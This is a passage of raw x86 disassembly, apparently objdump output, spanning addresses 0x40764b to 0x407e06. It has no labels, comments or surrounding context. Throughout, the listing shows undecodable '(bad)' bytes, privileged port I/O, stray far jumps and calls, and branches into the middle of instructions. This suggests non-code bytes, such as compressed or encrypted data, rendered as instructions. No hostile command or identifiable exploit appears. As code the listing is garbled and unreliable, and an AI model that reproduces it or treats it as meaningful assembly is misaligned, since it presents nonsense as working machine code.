  40764b:	cmp    DWORD PTR [edx+0x9edc49],ecx
  407651:	mov    esi,0xa3317f5c
  407656:	lock div al
  407659:	jp     0x4076ac
  40765b:	mov    dh,0xf7
  40765d:	test   al,0x68
  40765f:	and    DWORD PTR [eax-0xc],ebx
  407662:	shl    dh,1
  407664:	in     eax,dx
  407665:	popf   
  407666:	pop    edi
  407667:	nop
  407668:	out    dx,al
  407669:	sbb    ebx,ebp
  40766b:	mov    eax,ds:0x646c9580
  407670:	shl    DWORD PTR [ebx-0x46af0076],cl
  407676:	push   edx
  407678:	pop    bx
  40767a:	add    ah,al
  40767c:	lods   eax,DWORD PTR ds:[esi]
  40767d:	icebp  
  40767e:	sub    ebp,DWORD PTR [edi-0x69d75763]
  407684:	jge    0x4076c0
  407686:	pop    ebp
  407687:	push   esp
  407688:	or     cl,ch
  40768a:	push   esp
  40768b:	(bad)  
  40768d:	(bad)  
  40768e:	fbstp  TBYTE PTR [ecx-0x3d]
  407691:	(bad)  
  407692:	call   0xff6da987
  407697:	mov    esi,0xb7e0eeb5
  40769c:	retf   0x15d0
  40769f:	jbe    0x4076f2
  4076a1:	sbb    al,0x3e
  4076a3:	icebp  
  4076a4:	jno    0x407695
  4076a6:	mov    ebp,0x38a739ef
  4076ab:	pop    esp
  4076ac:	in     al,dx
  4076ad:	jmp    0x548b51ed
  4076b2:	pop    edx
  4076b3:	in     al,dx
  4076b4:	int3   
  4076b5:	xor    esp,DWORD PTR [ecx-0x64d183df]
  4076bb:	inc    edi
  4076bc:	and    eax,0xb5b27936
  4076c1:	jle    0x4076b4
  4076c3:	(bad)  
  4076c4:	ss pop es
  4076c6:	push   ebx
  4076c7:	jmp    eax
  4076c9:	test   esi,0x319f0a
  4076cf:	leave  
  4076d0:	mov    edx,0xca5fd3c9
  4076d5:	fwait
  4076d6:	cwde   
  4076d7:	cmp    cl,BYTE PTR [esi]
  4076d9:	ja     0x4076cf
  4076db:	aad    0x6c
  4076dd:	jp     0x4076a2
  4076df:	adc    edx,DWORD PTR [ebp+0x32]
  4076e2:	mov    BYTE PTR [edi+0x18],al
  4076e5:	int3   
  4076e6:	data16 fdivr QWORD PTR [esi]
  4076e9:	xor    al,0x47
  4076eb:	mov    ds:0x58b53382,eax
  4076f0:	scas   al,BYTE PTR es:[edi]
  4076f1:	stos   BYTE PTR es:[edi],al
  4076f2:	or     DWORD PTR [ecx+0x6a],esi
  4076f5:	mov    cl,0x66
  4076f7:	(bad)  
  4076f8:	idiv   dh
  4076fa:	xchg   ecx,eax
  4076fb:	and    BYTE PTR [ecx-0x433d65eb],ah
  407701:	sahf   
  407702:	sub    BYTE PTR [ecx],dh
  407704:	outs   dx,BYTE PTR ds:[esi]
  407705:	and    al,0xed
  407707:	out    dx,eax
  407708:	fwait
  407709:	or     DWORD PTR [edi],esp
  40770b:	add    al,0xfe
  40770d:	xlat   BYTE PTR ds:[ebx]
  40770e:	inc    ebx
  40770f:	pushf  
  407710:	loop   0x4076a9
  407712:	(bad)  
  407713:	push   ss
  407714:	inc    edx
  407715:	loop   0x4076f4
  407717:	sub    eax,0x25e9d76c
  40771c:	mov    ah,0xf7
  40771e:	in     eax,dx
  40771f:	imul   edi,eax,0xcf06dd8d
  407725:	fld    st(6)
  407727:	(bad)  
  407728:	pop    edx
  407729:	add    DWORD PTR [eax],ebp
  40772b:	jmp    0x737d:0x820e0731
  407732:	iret   
  407733:	lock and ch,ch
  407736:	mov    WORD PTR [ebp+0x4a5ab02a],?
  40773c:	push   eax
  40773d:	add    al,0x1
  40773f:	xor    DWORD PTR [edi-0x73],esi
  407742:	in     eax,dx
  407743:	icebp  
  407744:	xchg   ebx,eax
  407745:	mov    WORD PTR [ecx+edi*8-0x6ba3bfa6],?
  40774c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40774d:	xor    BYTE PTR [eax+0x3b],0x50
  407751:	jecxz  0x4077ca
  407753:	xchg   BYTE PTR [ecx+eax*4+0x72],ah
  407757:	and    BYTE PTR [ebx],bl
  407759:	xlat   BYTE PTR ds:[ebx]
  40775a:	sub    ah,cl
  40775c:	lods   al,BYTE PTR ds:[esi]
  40775d:	pop    ebp
  40775e:	add    eax,0x6f854bf3
  407763:	and    esi,DWORD PTR [esp+eax*4]
  407766:	loop   0x40777c
  407768:	mov    eax,0xd76ed029
  40776d:	into   
  40776e:	in     eax,0x48
  407770:	pop    esi
  407771:	ror    ch,1
  407773:	pop    edi
  407774:	jb     0x4077c1
  407776:	pop    es
  407777:	pop    ds
  407778:	repz or dl,BYTE PTR [edi+ebp*8-0x4ace647]
  407780:	stc    
  407781:	ss or  dh,ah
  407784:	sar    DWORD PTR ss:[ecx-0x35],cl
  407788:	scas   eax,DWORD PTR es:[edi]
  407789:	jmp    0x407725
  40778b:	iret   
  40778c:	lock jmp 0x4077b6
  40778f:	inc    ecx
  407790:	sbb    BYTE PTR [edx],ah
  407792:	adc    ebx,DWORD PTR [ecx+0x72149196]
  407798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407799:	scas   al,BYTE PTR es:[edi]
  40779a:	dec    eax
  40779b:	(bad)  
  40779c:	aaa    
  40779d:	dec    esp
  40779e:	pop    esi
  40779f:	sub    DWORD PTR ds:0xae49524f,ebx
  4077a5:	lock test bl,dh
  4077a8:	dec    esi
  4077a9:	pop    ss
  4077aa:	and    BYTE PTR [ecx+0x36],0x1f
  4077ae:	fisub  WORD PTR [ecx+0x42]
  4077b1:	push   eax
  4077b3:	lds    ebp,FWORD PTR [edx-0x526df631]
  4077b9:	and    dh,BYTE PTR [esi-0x2bfaa122]
  4077bf:	aaa    
  4077c0:	fstp   DWORD PTR ds:0x724b5ab0
  4077c6:	dec    edx
  4077c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077c8:	imul   edi,DWORD PTR [esp+edi*2],0xffffffe5
  4077cc:	aas    
  4077cd:	xor    DWORD PTR [edx+0x15],0x74
  4077d1:	mov    ds:0x1a07437b,eax
  4077d6:	push   eax
  4077d7:	and    eax,DWORD PTR [ebx-0x60ef8cc4]
  4077dd:	inc    ecx
  4077de:	mov    dh,0x88
  4077e0:	repnz mov al,cl
  4077e3:	call   0xb107:0xf972c04
  4077ea:	jp     0x407826
  4077ec:	pushf  
  4077ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077ee:	enter  0x9324,0xe5
  4077f2:	adc    al,0x82
  4077f4:	dec    eax
  4077f5:	imul   ecx,ecx,0x64
  4077f8:	inc    esp
  4077f9:	inc    edi
  4077fa:	imul   edx,DWORD PTR [ebx+0x2c],0xc085728e
  407801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407802:	xchg   edi,eax
  407803:	dec    edx
  407804:	xchg   edi,eax
  407805:	push   ecx
  407806:	or     DWORD PTR [esi+0x9fed981],ebp
  40780c:	cwde   
  40780d:	adc    BYTE PTR [edx+0x58],ah
  407810:	sbb    BYTE PTR ss:[ebp-0x4f],cl
  407814:	dec    edx
  407815:	or     bh,BYTE PTR [eax+0x1b]
  407818:	out    0x21,eax
  40781a:	rol    edi,cl
  40781c:	mov    ?,WORD PTR [eax-0x66]
  40781f:	pop    eax
  407820:	jb     0x4077df
  407822:	jns    0x407847
  407824:	pop    edx
  407825:	pop    esi
  407826:	test   al,0xb2
  407828:	xor    BYTE PTR [ecx+0x4],al
  40782b:	mov    al,0x4d
  40782d:	out    0x44,al
  40782f:	mov    edx,0x4e99b6e5
  407834:	push   cs
  407835:	pop    edx
  407836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407837:	pop    edi
  407838:	cli    
  407839:	(bad)  
  40783b:	or     BYTE PTR [edi],bl
  40783d:	mov    ss,WORD PTR [ebp+0x13da49b8]
  407843:	xor    bh,bl
  407845:	mov    al,0x88
  407847:	(bad)  
  407848:	mov    BYTE PTR [edx+0x126c2dc4],bh
  40784e:	adc    DWORD PTR [esi+ebx*2+0x7d],0x1e9b0b22
  407856:	dec    esp
  407857:	and    BYTE PTR [ebp-0x8bf1307],dl
  40785d:	and    eax,0x57eee156
  407862:	fwait
  407863:	scas   eax,DWORD PTR es:[edi]
  407864:	and    DWORD PTR [eax-0x16],ecx
  407867:	and    BYTE PTR [edi+0x3e],ch
  40786a:	ss push ds
  40786c:	es jge 0x4078ac
  40786f:	std    
  407870:	push   ebx
  407871:	outs   dx,DWORD PTR ds:[esi]
  407872:	ds cmc 
  407874:	mov    ch,0x59
  407876:	cmp    eax,0x700fea0e
  40787b:	mov    cl,0xc1
  40787d:	mov    al,0x86
  40787f:	inc    ebx
  407880:	aaa    
  407881:	rcl    ecx,1
  407883:	adc    eax,0x73ef973d
  407888:	ss repz mov bl,0xa8
  40788c:	fnstcw WORD PTR [edx-0x5c]
  40788f:	push   ds
  407890:	pusha  
  407891:	mov    ebp,0x27bb4c
  407896:	xchg   ebx,eax
  407897:	sbb    eax,0x47038255
  40789c:	(bad)  
  40789e:	sbb    al,dh
  4078a0:	dec    ebp
  4078a1:	or     BYTE PTR [ecx],dh
  4078a3:	enter  0x24e3,0x4a
  4078a7:	jge    0x40782d
  4078a9:	sahf   
  4078aa:	xchg   esp,eax
  4078ab:	cmc    
  4078ac:	sbb    ch,BYTE PTR [eax+0x2d]
  4078af:	sahf   
  4078b0:	retf   0x512
  4078b3:	jp     0x4078b3
  4078b5:	mov    ds:0x8e9a12bb,eax
  4078ba:	xor    DWORD PTR [eax],ebx
  4078bc:	add    eax,0x3faf6910
  4078c1:	dec    eax
  4078c2:	bound  edi,QWORD PTR [ecx+esi*2+0x2a057fcd]
  4078c9:	add    DWORD PTR ds:0x641aa011,edx
  4078cf:	gs jecxz 0x407891
  4078d2:	adc    BYTE PTR [ebx+esi*8-0x31],bh
  4078d6:	xchg   ecx,eax
  4078d7:	loop   0x4078bf
  4078d9:	mov    al,0x4b
  4078db:	adc    bh,BYTE PTR [ecx]
  4078dd:	scas   al,BYTE PTR es:[edi]
  4078de:	hlt    
  4078df:	jno    0x4078d6
  4078e1:	jmp    0xd806:0x26f0c7a7
  4078e8:	add    eax,0x13067772
  4078ed:	mov    ebp,0xc41edaea
  4078f2:	jns    0x40796e
  4078f4:	and    DWORD PTR [esi+eiz*1],esp
  4078f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078f8:	push   ecx
  4078f9:	dec    esi
  4078fa:	iret   
  4078fb:	inc    esi
  4078fc:	repz push ss
  4078fe:	lahf   
  4078ff:	test   BYTE PTR [ebp+0x5c],0x69
  407903:	push   esi
  407904:	cmp    al,0x80
  407906:	jnp    0x407968
  407908:	jno    0x407988
  40790a:	test   eax,0x141016c8
  40790f:	inc    BYTE PTR [edi]
  407911:	jle    0x40796b
  407913:	add    edx,ecx
  407915:	rcr    BYTE PTR [esi+0x6916f3de],cl
  40791b:	iret   
  40791c:	dec    ecx
  40791d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40791e:	mov    bh,BYTE PTR [edi-0x71]
  407921:	fldcw  WORD PTR [esi+0x52b78c08]
  407927:	jmp    0xbb576ba4
  40792c:	sub    esi,DWORD PTR [eax+0x5c]
  40792f:	pop    ebp
  407930:	cmp    ah,dh
  407932:	add    DWORD PTR gs:[edx+0x43],esp
  407936:	or     ebp,DWORD PTR [ecx+0x33]
  407939:	cmp    BYTE PTR [ecx],ah
  40793b:	or     al,0xf8
  40793d:	fisttp QWORD PTR [ebp+0x2c8b6245]
  407943:	mov    bh,0xef
  407945:	sbb    al,0x8c
  407947:	push   ebp
  407948:	icebp  
  407949:	aam    0xb1
  40794b:	(bad)  
  40794c:	adc    eax,0x45ce35ed
  407951:	xor    DWORD PTR [edx-0x5bfc3ed9],0x44b8ae35
  40795b:	aad    0x91
  40795d:	(bad)  
  40795e:	daa    
  40795f:	mov    al,0x12
  407961:	pop    ebx
  407962:	aad    0x9d
  407964:	mov    bl,0xca
  407966:	inc    eax
  407967:	and    al,0xc
  407969:	(bad)
  40796c:	mov    esp,0xe63f9715
  407971:	mov    esi,0xbb50e41a
  407976:	popa   
  407977:	mov    DWORD PTR [ebp+eiz*1+0x6],ecx
  40797b:	sub    al,0xa1
  40797d:	adc    eax,0x408e099e
  407982:	lods   eax,DWORD PTR ds:[esi]
  407983:	inc    ecx
  407984:	cmp    DWORD PTR [ecx*4+0x2a71c756],0x6f
  40798c:	js     0x40797e
  40798e:	and    BYTE PTR [ecx-0x1f],0xd7
  407992:	pop    eax
  407993:	aaa    
  407994:	or     al,BYTE PTR [edx+ebx*1+0xe9c77d9]
  40799b:	push   esi
  40799c:	ficomp WORD PTR [ebx]
  40799e:	es and eax,0xa8c81f7f
  4079a4:	ins    BYTE PTR es:[edi],dx
  4079a5:	push   edi
  4079a6:	(bad)  
  4079a7:	daa    
  4079a8:	fs jp  0x407930
  4079ab:	inc    eax
  4079ac:	les    esp,FWORD PTR [ebx]
  4079ae:	cmp    BYTE PTR [eax*8-0x6a6ad5f3],bh
  4079b5:	add    BYTE PTR [ebx-0x7e4bcc90],bl
  4079bb:	and    DWORD PTR [ecx-0x16],0x6f4eeeba
  4079c2:	mov    ds:0x9e479424,eax
  4079c7:	sub    ecx,DWORD PTR [ecx-0x7e]
  4079ca:	div    DWORD PTR [eax+0x57]
  4079cd:	or     eax,0x1248945d
  4079d2:	icebp  
  4079d3:	push   es
  4079d4:	je     0x4079f8
  4079d6:	ins    DWORD PTR es:[edi],dx
  4079d7:	jg     0x4079ef
  4079d9:	mov    bl,0xb7
  4079db:	rcr    DWORD PTR [ebp-0x19e3b1c7],1
  4079e1:	jecxz  0x4079eb
  4079e3:	fsub   st,st(6)
  4079e5:	adc    esp,edi
  4079e7:	mov    bh,0x8e
  4079e9:	enter  0xc040,0xfa
  4079ed:	test   eax,0x556dc414
  4079f2:	cmp    eax,0x55e72a2f
  4079f7:	xlat   BYTE PTR ds:[ebx]
  4079f8:	leave  
  4079f9:	ds inc eax
  4079fb:	add    ebp,ebp
  4079fd:	popa   
  4079fe:	loope  0x407a09
  407a00:	pop    eax
  407a01:	xor    dh,BYTE PTR [eax-0x13]
  407a04:	mov    dl,0xe0
  407a06:	pop    edx
  407a07:	mov    al,0xc5
  407a09:	loop   0x4079ea
  407a0b:	dec    esp
  407a0c:	fimul  DWORD PTR [edx]
  407a0e:	test   dh,dl
  407a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a11:	cmp    DWORD PTR [eax+ebx*8-0x5],esi
  407a15:	adc    edi,0xbc2d18a5
  407a1b:	scas   eax,DWORD PTR es:[edi]
  407a1c:	lea    edi,ds:0xd18d66e1
  407a22:	pop    edi
  407a23:	xlat   BYTE PTR ds:[ebx]
  407a24:	addr16 je 0x407a32
  407a27:	sbb    eax,0x804eb80a
  407a2c:	call   0xc7bbc605
  407a31:	dec    esp
  407a32:	xor    DWORD PTR gs:[eax-0x6c],0x6da85a9
  407a3a:	lods   al,BYTE PTR ds:[esi]
  407a3b:	lea    esp,[edx+ecx*2+0x1]
  407a3f:	nop
  407a40:	ja     0x407a13
  407a42:	xor    ebx,DWORD PTR [ebp*4-0x428a98d5]
  407a49:	mov    edi,0xdbdc4837
  407a4e:	xchg   edi,eax
  407a4f:	loop   0x407a82
  407a51:	cmp    bl,ah
  407a53:	cmp    BYTE PTR [edi-0x1554ead7],0x6d
  407a5a:	pop    es
  407a5b:	in     eax,dx
  407a5c:	xor    eax,edi
  407a5e:	mov    cl,0xce
  407a60:	and    bh,BYTE PTR [esi]
  407a62:	loope  0x407ad7
  407a64:	mov    ds:0x158c212f,al
  407a69:	or     BYTE PTR [ebp*8-0x39dbb54],ah
  407a70:	push   edx
  407a71:	dec    ebx
  407a72:	sub    dh,0xe
  407a75:	mov    ebp,0xd3019a76
  407a7a:	push   ds
  407a7b:	pop    es
  407a7c:	pop    edi
  407a7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a7e:	xor    edi,DWORD PTR [edx+ebx*2-0x5a]
  407a82:	ret    0x3b57
  407a85:	pushf  
  407a86:	into   
  407a87:	dec    esi
  407a88:	sub    eax,0xa6c87b78
  407a8d:	idiv   esi
  407a8f:	adc    dh,dh
  407a91:	stos   BYTE PTR es:[edi],al
  407a92:	adc    BYTE PTR fs:[ecx+0x62],dl
  407a96:	sbb    eax,DWORD PTR [eax+0x4dfa350c]
  407a9c:	ror    DWORD PTR [edx-0x61d9c245],0xf1
  407aa3:	(bad)  
  407aa4:	jmp    0x407a62
  407aa6:	lea    eax,ds:0x3f845f12
  407aac:	outs   dx,BYTE PTR ds:[esi]
  407aad:	test   al,0xc8
  407aaf:	std    
  407ab0:	adc    esp,DWORD PTR [ecx-0x74]
  407ab3:	mov    al,ds:0xeeefee8
  407ab8:	arpl   WORD PTR [ebp+0x2057d9d9],sp
  407abe:	jg     0x407aea
  407ac0:	add    DWORD PTR ds:0x3c4550bf,ecx
  407ac6:	or     eax,0xa36b8cb1
  407acb:	mov    ds:0x2ee80a51,al
  407ad0:	pop    edi
  407ad1:	out    dx,eax
  407ad2:	dec    esp
  407ad3:	inc    ebx
  407ad4:	dec    edi
  407ad5:	(bad)  
  407ad7:	jo     0x407b22
  407ad9:	dec    edi
  407ada:	out    dx,eax
  407adb:	jo     0x407a82
  407add:	sub    edi,esi
  407adf:	js     0x407b46
  407ae1:	retf   0x9fef
  407ae4:	test   edx,ecx
  407ae6:	icebp  
  407ae7:	loop   0x407a8c
  407ae9:	call   0xb6ee:0x97ed9144
  407af0:	lds    ecx,FWORD PTR [edi]
  407af2:	rcr    BYTE PTR [edi-0x127d2e6b],cl
  407af8:	pop    ss
  407af9:	xchg   edx,eax
  407afa:	cmp    bl,BYTE PTR [ebx-0x2884b73c]
  407b00:	and    BYTE PTR [eax],ah
  407b02:	sub    bl,BYTE PTR [eax]
  407b04:	stos   DWORD PTR es:[edi],eax
  407b05:	aad    0x76
  407b07:	mov    ds:0x5d00553f,eax
  407b0c:	adc    DWORD PTR [ebp+0x3c],0x754fb278
  407b13:	mov    eax,ds:0xb8389cda
  407b18:	jge    0x407b01
  407b1a:	xchg   ecx,eax
  407b1b:	pop    esi
  407b1c:	pop    ds
  407b1d:	and    al,0xe1
  407b1f:	push   es
  407b20:	cmp    eax,DWORD PTR [ebx-0x73]
  407b23:	rcr    BYTE PTR [ecx+0x24],0x9d
  407b27:	cmp    ecx,DWORD PTR [ecx]
  407b29:	mov    dl,0x5e
  407b2b:	scas   eax,DWORD PTR es:[edi]
  407b2c:	cld    
  407b2d:	mov    ?,WORD PTR [edx]
  407b2f:	sub    al,0x59
  407b31:	in     al,0xd0
  407b33:	popf   
  407b34:	sbb    al,0x42
  407b36:	sbb    al,0x9b
  407b38:	out    0x17,eax
  407b3a:	imul   esi,edx,0xffffff93
  407b3d:	dec    eax
  407b3e:	in     al,dx
  407b3f:	cli    
  407b40:	popf   
  407b41:	pop    eax
  407b42:	push   eax
  407b43:	mov    dh,0x1f
  407b45:	xchg   esi,eax
  407b46:	add    bh,BYTE PTR [ecx]
  407b48:	inc    ebx
  407b49:	or     eax,0x76eddb77
  407b4e:	inc    DWORD PTR [eax+eax*2+0x64]
  407b52:	or     al,0xc
  407b54:	aas    
  407b55:	jge    0x407b08
  407b57:	mov    eax,0xc597de68
  407b5c:	mov    ds:0x72fb2e3f,al
  407b61:	(bad)  
  407b62:	sub    DWORD PTR [edi-0x2222c1fd],edx
  407b68:	addr16 add ch,dl
  407b6b:	inc    edx
  407b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b6d:	jg     0x407bd2
  407b6f:	bnd call 0x1bbed848
  407b75:	call   0x4220:0xb3c3b991
  407b7c:	inc    eax
  407b7d:	loop   0x407bf8
  407b7f:	dec    edi
  407b80:	les    edx,FWORD PTR [ebx+esi*4+0x8]
  407b84:	pop    esp
  407b85:	mov    BYTE PTR [ecx-0x4d],al
  407b88:	lods   al,BYTE PTR ds:[esi]
  407b89:	sbb    eax,DWORD PTR [edx]
  407b8b:	std    
  407b8c:	adc    esp,eax
  407b8e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  407b90:	pop    esi
  407b91:	cwd    
  407b93:	aad    0xf1
  407b95:	mov    DWORD PTR [esi+0x6c],esi
  407b98:	xchg   ebp,eax
  407b99:	sahf   
  407b9a:	in     eax,0xd6
  407b9c:	push   edi
  407b9d:	shr    BYTE PTR [eax-0x755346dc],0x2f
  407ba4:	sub    al,0x29
  407ba6:	rol    DWORD PTR [eax+ebx*8],cl
  407ba9:	unpcklps xmm5,xmm1
  407bac:	add    bh,bl
  407bae:	dec    esi
  407baf:	xchg   esp,eax
  407bb0:	push   edx
  407bb1:	cmp    DWORD PTR [eax+0x569a333e],edi
  407bb7:	int3   
  407bb8:	mov    bl,0xa2
  407bba:	clc    
  407bbb:	mov    al,BYTE PTR [eax+esi*4-0x63c64541]
  407bc2:	int3   
  407bc3:	xchg   edi,eax
  407bc4:	pop    edx
  407bc5:	xor    DWORD PTR [eax],ebx
  407bc7:	mov    BYTE PTR ds:0x2ec97e0a,al
  407bcd:	ss fwait
  407bcf:	mov    ecx,0x6f4cd837
  407bd4:	add    al,0x6e
  407bd6:	inc    ebx
  407bd7:	cmp    DWORD PTR [esp+ecx*8-0x9],ecx
  407bdb:	rcr    DWORD PTR [eax-0xb],1
  407bde:	cmp    al,0x66
  407be0:	(bad)  
  407be1:	dec    ebx
  407be2:	jnp    0x407b83
  407be4:	pop    edi
  407be5:	jne    0x407bc4
  407be7:	or     al,0xae
  407be9:	dec    esp
  407bea:	xchg   esp,eax
  407beb:	sub    DWORD PTR [edi+0x20],esi
  407bee:	fistp  QWORD PTR [ecx-0x38ccc2f4]
  407bf4:	imul   ecx,DWORD PTR [ebx],0x5d
  407bf7:	popa   
  407bf8:	sub    eax,0x7701fb7
  407bfd:	mov    dl,0x28
  407bff:	jecxz  0x407bd4
  407c01:	jo     0x407c5c
  407c03:	out    dx,eax
  407c04:	(bad)  
  407c05:	cmp    bh,BYTE PTR [eax]
  407c07:	mov    eax,ds:0x6ec5a0fe
  407c0c:	inc    esp
  407c0d:	xchg   edx,eax
  407c0e:	or     eax,DWORD PTR [esi+0xb79488e]
  407c14:	mov    bl,BYTE PTR [esi-0x52]
  407c17:	test   eax,0x5c533e04
  407c1c:	popa   
  407c1d:	jp     0x407ba8
  407c1f:	test   DWORD PTR ds:0xd3edb8eb,0xc0c8d01a
  407c29:	lods   eax,DWORD PTR ds:[esi]
  407c2a:	call   DWORD PTR [esi]
  407c2c:	push   esp
  407c2d:	and    DWORD PTR [esi],0x6
  407c30:	popa   
  407c31:	sub    esi,DWORD PTR [ebx-0x377de755]
  407c37:	push   esi
  407c38:	lods   eax,DWORD PTR ds:[esi]
  407c39:	lahf   
  407c3a:	fs inc eax
  407c3c:	cmp    edi,DWORD PTR [eax]
  407c3e:	mov    eax,0x49fb43e
  407c43:	mov    esi,0xd1cf4648
  407c48:	(bad)  
  407c49:	or     al,0x8c
  407c4b:	push   0x923758cc
  407c50:	in     eax,dx
  407c51:	in     al,0xe
  407c53:	ds test eax,0xde095a34
  407c59:	sahf   
  407c5a:	scas   eax,DWORD PTR es:[edi]
  407c5b:	jo     0x407c58
  407c5d:	and    BYTE PTR [eax],cl
  407c5f:	int3   
  407c60:	inc    ebp
  407c61:	sbb    al,0xad
  407c63:	retf   0x44fa
  407c66:	push   es
  407c67:	outs   dx,BYTE PTR ds:[esi]
  407c68:	push   cs
  407c69:	cmp    ah,ch
  407c6b:	adc    al,BYTE PTR ds:0xb215935e
  407c71:	cmp    eax,ebp
  407c73:	push   cs
  407c74:	retf   0xd1b9
  407c77:	leave  
  407c78:	arpl   WORD PTR [esi-0x5f27f31e],cx
  407c7e:	les    edi,FWORD PTR [edi-0x56]
  407c81:	fadd   DWORD PTR [esi]
  407c83:	dec    edx
  407c84:	pop    eax
  407c85:	sbb    DWORD PTR [edi+0x580b1748],esp
  407c8b:	jmp    0x107:0x7a0a5128
  407c92:	gs call 0x510b:0x3d5cf93c
  407c9a:	in     al,0x9a
  407c9c:	call   0xe363:0x97a7509e
  407ca3:	pop    ss
  407ca4:	rol    DWORD PTR [ebx],0x1f
  407ca7:	popa   
  407ca8:	and    BYTE PTR [eax],ch
  407caa:	adc    DWORD PTR [esi+0x4a],edx
  407cad:	xchg   ebp,eax
  407cae:	fnstcw WORD PTR [edi+edi*8]
  407cb1:	rol    BYTE PTR [eax],0xb9
  407cb4:	adc    BYTE PTR [esi],0x11
  407cb7:	les    eax,FWORD PTR [eax+0xd]
  407cba:	les    esi,FWORD PTR [eax+0x68]
  407cbd:	xchg   esi,eax
  407cbe:	in     eax,0x80
  407cc0:	jae    0x407c60
  407cc2:	fcmovnu st,st(1)
  407cc4:	xor    al,BYTE PTR [ebx]
  407cc6:	push   eax
  407cc7:	xor    al,0x84
  407cc9:	loop   0x407c76
  407ccb:	sbb    eax,0x2dc5c365
  407cd0:	ins    BYTE PTR es:[edi],dx
  407cd1:	adc    si,WORD PTR [ebp-0x2a3fcb]
  407cd8:	xchg   ebp,eax
  407cd9:	or     dl,BYTE PTR [eax+0x7cec3e6]
  407cdf:	jl     0x407c8e
  407ce1:	jp     0x407d44
  407ce3:	(bad)  
  407ce4:	and    eax,0xd8bafe47
  407ce9:	jmp    0x54e3:0x13ab45ca
  407cf0:	jecxz  0x407c9e
  407cf2:	adc    BYTE PTR [esi],al
  407cf4:	push   cs
  407cf5:	stos   BYTE PTR es:[edi],al
  407cf6:	xlat   BYTE PTR ds:[ebx]
  407cf7:	mov    dh,0x5
  407cf9:	jnp    0x407d4f
  407cfb:	scas   al,BYTE PTR es:[edi]
  407cfc:	imul   BYTE PTR [ebp-0x27ac1a2b]
  407d02:	cld    
  407d03:	call   0x21a1b2a4
  407d08:	pop    ds
  407d09:	ret    0x948
  407d0c:	xor    ch,BYTE PTR [ecx+0x40]
  407d0f:	inc    eax
  407d10:	and    eax,0x48f382b6
  407d15:	pop    esp
  407d16:	mov    dl,0x5f
  407d18:	dec    ebp
  407d19:	add    BYTE PTR [ebx-0x76cc3a7f],al
  407d1f:	popa   
  407d20:	xchg   ebx,eax
  407d21:	jae    0x407d87
  407d23:	add    al,0x92
  407d25:	sub    ebx,DWORD PTR [eax]
  407d27:	mov    al,0xfa
  407d29:	jae    0x407cb8
  407d2b:	jae    0x407d5f
  407d2d:	push   0x70
  407d2f:	mov    esi,0xae9138a
  407d34:	dec    eax
  407d35:	mov    edx,0x9a0ff42e
  407d3a:	dec    ebp
  407d3b:	mul    DWORD PTR [eax-0x7fbd3b07]
  407d41:	mov    ecx,0xf8080014
  407d46:	push   esi
  407d47:	test   eax,0x7730e219
  407d4c:	mov    bl,0xf4
  407d4e:	sbb    eax,0xa4aebd80
  407d53:	ss mov dh,0x67
  407d56:	rcl    BYTE PTR [ecx+0x1bbf330c],0xc4
  407d5d:	test   al,0xad
  407d5f:	loop   0x407ce3
  407d61:	push   cs
  407d62:	fwait
  407d63:	clc    
  407d64:	lods   eax,DWORD PTR ds:[esi]
  407d65:	fbld   TBYTE PTR [ebx+edi*4]
  407d68:	stos   BYTE PTR es:[edi],al
  407d69:	push   cs
  407d6a:	mov    DWORD PTR [edx+0x5857b020],edi
  407d70:	add    eax,DWORD PTR [esi-0x5e2b5aaf]
  407d76:	mov    ebx,0xcce31d65
  407d7b:	xor    al,0xf3
  407d7d:	xor    DWORD PTR [edx],ebp
  407d7f:	ret    
  407d80:	or     al,0xcb
  407d82:	test   al,0x8b
  407d84:	(bad)  
  407d86:	les    edx,FWORD PTR [edx+0x22547c3f]
  407d8c:	dec    esi
  407d8d:	push   esi
  407d8e:	lods   al,BYTE PTR ds:[esi]
  407d8f:	push   ecx
  407d90:	inc    esp
  407d91:	in     al,dx
  407d92:	repz fst QWORD PTR [edi+edx*8+0x7426a052]
  407d9a:	cwde   
  407d9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d9c:	(bad)  
  407d9d:	(bad)  
  407d9e:	in     eax,0x86
  407da0:	mov    esi,0x44b48f84
  407da5:	(bad)  
  407da6:	and    al,0x2b
  407da8:	iret   
  407da9:	push   ds
  407daa:	lods   al,BYTE PTR ds:[esi]
  407dab:	das    
  407dac:	or     eax,0xb7f1c421
  407db1:	fsubr  QWORD PTR [esi-0x75]
  407db4:	push   ebx
  407db5:	pop    edi
  407db6:	popa   
  407db7:	mov    esp,0x75d2a912
  407dbc:	push   ebx
  407dbd:	sub    al,0x5b
  407dbf:	add    bh,BYTE PTR es:[eax+0x2e]
  407dc3:	dec    ebp
  407dc4:	imul   eax,DWORD PTR [eax-0x6],0x4b9dd0fa
  407dcb:	and    BYTE PTR [eax-0x70],ah
  407dce:	outs   dx,DWORD PTR ds:[esi]
  407dcf:	repz push ss
  407dd1:	push   ecx
  407dd2:	and    ebp,DWORD PTR [ebp-0x5b]
  407dd5:	push   eax
  407dd6:	(bad)  
  407dd7:	pop    esp
  407dd8:	mov    edi,0x9935c608
  407ddd:	mov    cs,WORD PTR [eax]
  407ddf:	fs xchg ebp,eax
  407de1:	sub    ecx,DWORD PTR [ecx-0x78]
  407de4:	dec    edx
  407de5:	adc    al,ch
  407de7:	pop    ss
  407de8:	pusha  
  407de9:	stc    
  407dea:	jns    0x407e67
  407dec:	nop    edx
  407def:	mov    cl,0xb3
  407df1:	xchg   BYTE PTR [ebp-0x316ae40a],ah
  407df7:	cmp    al,0x8c
  407df9:	das    
  407dfa:	stos   BYTE PTR es:[edi],al
  407dfb:	pop    ebp
  407dfc:	gs adc al,0xec
  407dff:	cdq    
  407e00:	sub    DWORD PTR [eax],0xc0d6b836
  407e06:	fbld   TBYTE PTR [ebx+0x6125be04]
